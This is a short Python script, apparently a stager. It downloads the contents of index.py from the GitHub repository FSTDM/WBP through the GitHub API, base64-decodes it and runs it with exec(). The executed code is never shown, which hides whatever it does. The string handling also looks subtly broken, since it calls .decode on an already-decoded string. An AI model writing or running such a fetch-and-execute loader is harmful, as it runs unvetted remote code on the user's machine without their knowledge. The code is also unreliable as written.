import base64
import urllib.request
exec(base64.b64decode(urllib.request.urlopen("https://api.github.com/repos/FSTDM/WBP/contents/index.py").read().decode('utf-8').split(',"content":"')[1].split('\\n"')[0].decode('utf-8')))
